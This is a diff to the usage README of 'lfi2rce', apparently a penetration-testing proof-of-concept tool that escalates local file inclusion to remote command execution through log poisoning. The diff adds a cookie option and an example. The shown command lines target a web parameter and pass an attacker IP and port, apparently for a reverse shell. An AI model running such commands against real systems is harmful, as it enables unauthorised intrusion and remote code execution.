@@ -1,4 +1,3 @@
-# lfi2rce
 Local File Inclusion To Remote Command Execution (PoC)  
 
 ```
@@ -12,6 +11,10 @@ Options:
     -t <poison type>
     -r <attacker ip address>
     -p <attacker port>
+
+Cookie mode:                  (lfi2rce via cookies)
+
+    --cookie <value>
 
 Override default log paths:   (this will follow selected poison type schema)
 
@@ -32,4 +35,5 @@ Examples:
     python3 lfi2rce -u "http://ghost.server/index.php?search=" -t smtp -r 10.0.2.15 -p 1337 -l /var/mail/secure/mail.log
     python3 lfi2rce -u "http://ghost.server/index.php?search=" -t ftp -r 10.0.2.15 -p 1337
     python3 lfi2rce -u "http://ghost.winserver/index.php?s=" -t windows -r 10.0.2.15 -p 1337
+    python3 lfi2rce -u "http://ghost.server/index.php" -t ftp -r 10.0.2.15 -p 1337 --cookie session
 ```
